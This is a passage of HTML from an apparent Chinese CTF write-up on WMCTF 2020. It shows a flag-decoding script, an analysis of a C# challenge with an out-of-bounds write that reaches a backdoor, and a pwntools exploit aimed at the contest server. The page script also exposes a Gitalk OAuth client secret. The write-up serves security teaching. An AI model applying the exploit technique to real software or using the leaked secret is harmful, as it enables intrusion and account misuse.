class="string">&#x27;1&#x27;</span>,<span class="number">0x3</span>:<span class="string">&#x27;2&#x27;</span>,<span class="number">0x4</span>:<span class="string">&#x27;3&#x27;</span>,<span class="number">0x5</span>:<span class="string">&#x27;4&#x27;</span>,<span class="number">0x6</span>:<span class="string">&#x27;5&#x27;</span>,<span class="number">0x7</span>:<span class="string">&#x27;6&#x27;</span>,<span class="number">0x8</span>:<span class="string">&#x27;7&#x27;</span>,<span class="number">0x9</span>:<span class="string">&#x27;8&#x27;</span>,<span class="number">0xa</span>:<span class="string">&#x27;9&#x27;</span>,<span class="number">0xb</span>:<span class="string">&#x27;0&#x27;</span>,<span class="number">0xc</span>:<span class="string">&#x27;_&#x27;</span>,<span class="number">0xd</span>:<span class="string">&#x27;+&#x27;</span>,<span class="number">0x10</span>:<span class="string">&#x27;q&#x27;</span>,<span class="number">0x11</span>:<span class="string">&#x27;w&#x27;</span>,<span class="number">0x12</span>:<span class="string">&#x27;e&#x27;</span>,<span class="number">0x13</span>:<span class="string">&#x27;r&#x27;</span>,<span class="number">0x14</span>:<span class="string">&#x27;t&#x27;</span>,<span class="number">0x15</span>:<span class="string">&#x27;y&#x27;</span>,<span class="number">0x16</span>:<span class="string">&#x27;u&#x27;</span>,<span class="number">0x17</span>:<span class="string">&#x27;i&#x27;</span>,<span class="number">0x18</span>:<span class="string">&#x27;o&#x27;</span>,<span class="number">0x19</span>:<span class="string">&#x27;p&#x27;</span>,<span class="number">0x1a</span>:<span class="string">&#x27;&#123;&#x27;</span>,<span class="number">0x1b</span>:<span class="string">&#x27;&#125;&#x27;</span>,<span class="number">0x1e</span>:<span class="string">&#x27;a&#x27;</span>,<span class="number">0x1f</span>:<span class="string">&#x27;s&#x27;</span>,<span class="number">0x20</span>:<span class="string">&#x27;d&#x27;</span>,<span class="number">0x21</span>:<span class="string">&#x27;f&#x27;</span>,<span class="number">0x22</span>:<span class="string">&#x27;g&#x27;</span>,<span class="number">0x23</span>:<span class="string">&#x27;h&#x27;</span>,<span class="number">0x24</span>:<span class="string">&#x27;j&#x27;</span>,<span class="number">0x25</span>:<span class="string">&#x27;k&#x27;</span>,<span class="number">0x26</span>:<span class="string">&#x27;l&#x27;</span>,<span class="number">0x2c</span>:<span class="string">&#x27;z&#x27;</span>,<span class="number">0x2d</span>:<span class="string">&#x27;x&#x27;</span>,<span class="number">0x2e</span>:<span class="string">&#x27;c&#x27;</span>,<span class="number">0x2f</span>:<span class="string">&#x27;v&#x27;</span>,<span class="number">0x30</span>:<span class="string">&#x27;b&#x27;</span>,<span class="number">0x31</span>:<span class="string">&#x27;n&#x27;</span>,<span class="number">0x32</span>:<span class="string">&#x27;m&#x27;</span>,<span class="number">0x39</span>:<span class="string">&#x27; &#x27;</span>,&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):<span class="comment">#键盘映射回去</span></span><br><span class="line">    <span class="keyword">if</span> flag[i]&gt;<span class="number">0x39</span>:</span><br><span class="line">        flag[i] -= <span class="number">0x30</span></span><br><span class="line">        flag[i] = key_board_mapping[flag[i]].upper()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag[i] = key_board_mapping[flag[i]]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    <span class="built_in">print</span>(i,end = <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment">#WMCTF&#123;D0_Y0u_kn0w_th3_Pr0t3ct3dM0d3&#125;</span></span><br><span class="line"><span class="comment">#也可以解出数后按照数组手动还原</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="0x04-mengyedekending"><a href="#0x04-mengyedekending" class="headerlink" title="0x04 mengyedekending"></a>0x04 mengyedekending</h1><p>一道windows pwn，用C#写的，第一次做，代码好不容易才看懂，太菜了太菜了…</p>
+<p>拿过题来是这些东西</p>
+<p><img src="https://i.loli.net/2020/08/06/3qGKAzEmVytMucQ.png"></p>
+<p>用IDA打开baby_Cat.exe很乱找不到有用的函数，但有很多类似的字符串信息</p>
+<p><img src="https://i.loli.net/2020/08/29/JrjSYVqvFPBATkR.png"></p>
+<p>可以猜测出这个exe实际上是在加载dll，程序主要的逻辑就在加载的dll中执行。</p>
+<p>找到主函数，分析代码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> unsafe <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span><span class="params">(<span class="built_in">string</span>[] args)</span></span></span><br><span class="line"><span class="function">		</span>&#123;</span><br><span class="line">			<span class="keyword">char</span>* ptr = stackalloc <span class="keyword">char</span>[(UIntPtr)<span class="number">100</span>]; <span class="comment">//开辟100大小的空间</span></span><br><span class="line">			<span class="keyword">int</span> num = <span class="number">1</span>;</span><br><span class="line">			<span class="keyword">int</span>* ptr2 = (<span class="keyword">int</span>*)(ptr + <span class="number">50</span>);    <span class="comment">// ptr2指向ptr偏移50的位置</span></span><br><span class="line">			Program @object = <span class="keyword">new</span> Program();</span><br><span class="line">			Program.MsgHandler msgHandler = <span class="keyword">new</span> Program.MsgHandler(@object.Right);</span><br><span class="line">			Program.MsgHandler msgHandler2 = <span class="keyword">new</span> Program.MsgHandler(@object.Backdoor);<span class="comment">//  backdoor</span></span><br><span class="line">			Console.WriteLine(<span class="string">&quot;This is a gift for you : &#123;0:x4&#125;&quot;</span>, &amp;num);<span class="comment">//输出num的地址</span></span><br><span class="line">			Console.WriteLine(<span class="string">&quot;What do you want me to repeat?&quot;</span>);</span><br><span class="line">			ptr2[<span class="number">1</span>] = <span class="number">0</span>;  <span class="comment">//记录输入的字符个数</span></span><br><span class="line">			ptr2[<span class="number">2</span>] = ptr; <span class="comment">//指向ptr</span></span><br><span class="line">			*ptr2 = <span class="number">0</span>; <span class="comment">//即ptr[50] = 0</span></span><br><span class="line">			<span class="keyword">while</span> (ptr2[<span class="number">1</span>] &lt; <span class="number">53</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">char</span> c = (<span class="keyword">char</span>)Console.Read(); <span class="comment">//读入字符</span></span><br><span class="line">				<span class="keyword">bool</span> flag = c == <span class="string">&#x27;\n&#x27;</span>; <span class="comment">//若换行符则跳出</span></span><br><span class="line">				<span class="keyword">if</span> (flag)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">break</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">bool</span> flag2 = c == <span class="string">&#x27;\r&#x27;</span>;<span class="comment">//若不是回车则进入循环</span></span><br><span class="line">				<span class="keyword">if</span> (!flag2)</span><br><span class="line">				&#123;</span><br><span class="line">					ptr[*ptr2] = c;<span class="comment">//将字符写入</span></span><br><span class="line">					ptr2[<span class="number">1</span>]++;</span><br><span class="line">				&#125;</span><br><span class="line">				(*ptr2)++;<span class="comment">//偏移量+1</span></span><br><span class="line">			&#125;</span><br><span class="line">			Console.WriteLine(<span class="string">&quot;Do you want to change your input?&quot;</span>);</span><br><span class="line">			<span class="keyword">char</span> c2 = (<span class="keyword">char</span>)Console.Read();</span><br><span class="line">			<span class="keyword">bool</span> flag3 = c2 == <span class="string">&#x27;N&#x27;</span> || c2 == <span class="string">&#x27;n&#x27;</span>;</span><br><span class="line">			<span class="keyword">if</span> (flag3)</span><br><span class="line">			&#123;</span><br><span class="line">				msgHandler(ptr);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">				Console.WriteLine(<span class="string">&quot;Please tell me a offset!&quot;</span>);</span><br><span class="line">				<span class="keyword">char</span>* ptr3 = ptr2[<span class="number">2</span>];</span><br><span class="line">				Console.ReadLine();</span><br><span class="line">				<span class="keyword">int</span> num2 = Console.Read();</span><br><span class="line">				<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; num2; i++)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="keyword">char</span>* ptr4 = ptr3 + i;</span><br><span class="line">					*ptr4 -= <span class="string">&#x27;\u0001&#x27;</span>; <span class="comment">//对内存的数—1</span></span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">bool</span> flag4 = num == <span class="number">1</span>;</span><br><span class="line">				<span class="keyword">if</span> (flag4)</span><br><span class="line">				&#123;</span><br><span class="line">					msgHandler(ptr);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">else</span></span><br><span class="line">				&#123;</span><br><span class="line">					msgHandler2(ptr);        <span class="comment">//后门函数</span></span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
+
+<p>后门函数长这样:</p>
+<p><img src="https://i.loli.net/2020/08/06/Op35ZHshlN1tk86.png"></p>
+<p>分析完毕，目标就是令num==0，绕过去执行这个后门函数</p>
+<p>程序关键点在这：</p>
+<p><img src="https://i.loli.net/2020/08/06/S2mAMz3L9WFnKhZ.png"></p>
+<p><code>ptr[*ptr2]</code>存放着我们的输入c，而*ptr2指向了ptr+50的位置，这个位置的值初始化为0，也就是说，我们的输入放在ptr[0]的位置，接着*ptr2++，使得输入逐渐后移。（啊！万恶的指针）</p>
+<p>而程序没有对数组边界进行检查，所以存在数组越界漏洞</p>
+<p>目标也很清楚了，由于程序第一个输出告诉了我们num的地址，那么我们只要找到num和输入的偏移，更改*ptr2的值，使其指向&amp;num-1的位置，下一次就可以覆盖到num==0了，进而执行backdoor</p>
+<p>dnspy动态调试，</p>
+<p><img src="https://i.loli.net/2020/08/06/dyKL8Ef6NPCmHut.png"></p>
+<p>所以可以计算偏移量：(0x02CFF000-0x02CFEF29)/2 = 0x6B  （C#使用的宽字节）</p>
+<p>因此覆盖ptr[50] ==0x6b，下一次覆盖num==’\x00’</p>
+<h2 id="0x05-exp"><a href="#0x05-exp" class="headerlink" title="0x05 exp"></a>0x05 exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;111.73.46.229&#x27;</span>, <span class="number">51000</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span> * <span class="number">50</span> + <span class="built_in">chr</span>(<span class="number">0x6b</span>) + <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">&#x27;1 hail ld1ng!&#x27;</span>)<span class="comment">#动调发现当首字符ascii&lt;83时有效，原因在于最后的循环</span></span><br><span class="line"><span class="comment">#p.sendline(&#x27;\x00&#x27;)#或者 send 0 直接跳出最后一个循环</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2020/08/06/EfSHcGaAC6TvqNP.png"></p>
+<p>成功~</p>
+<h1 id="0x06-小结"><a href="#0x06-小结" class="headerlink" title="0x06 小结"></a>0x06 小结</h1><p><strong>WMware</strong>的出题人是魔鬼，全程考察汇编能力，好多都是微机原理学过的内容（全忘干净了），趁此机会复习一下吧。</p>
+<p>不过看大神们说可以用IDA？我的IDA可能有自己的想法，还是算了…</p>
+<p><strong>mengyedekending</strong>看上去不难，这题比赛有35解</p>
+<p>但是第一次做这种类型的题还是很难受的，特别是指针的问题，在pwn中是重点，必须好好掌握</p>
+<p>这次比赛还是有收获的，噶油！</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://ld1ng.top/2020/08/05/WMCTF/">http://ld1ng.top/2020/08/05/WMCTF/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+
+            </section>
+        
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2020/08/06/Heap/">堆溢出漏洞利用总结</a>
+            
+            
+            <a class="next" rel="next" href="/2020/07/01/canary/">学习canary&&栈迁移</a>
+            
+        </section>
+
+    <div id="gitalk-container"></div>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css">
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js"></script>
+<script src="//cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.js"></script>
+<div id="gitalk-container"></div>
+<script type="text/javascript">
+      var gitalk = new Gitalk({
+        clientID: '458a98372426d92cae5a',
+        clientSecret: '91e874ad339e3ffbd20d52f4d247739c8e722a72',
+        repo: 'ld1ng.github.io',
+        owner: 'Ld1ng',
+        admin: 'Ld1ng',
+        id: md5(location.pathname),
+        labels: 'Gitalk'.split(',').filter(l => l),
+        perPage: 10,
+        pagerDirection: 'last',
+        createIssueManually: true,
+        distractionFreeMode: false
+      })
+      gitalk.render('gitalk-container')
+</script>
+
+
+    </article>
+</div>
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>Ld1ng🍕 © 2020 - 2023 │ Powered by <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+</html>
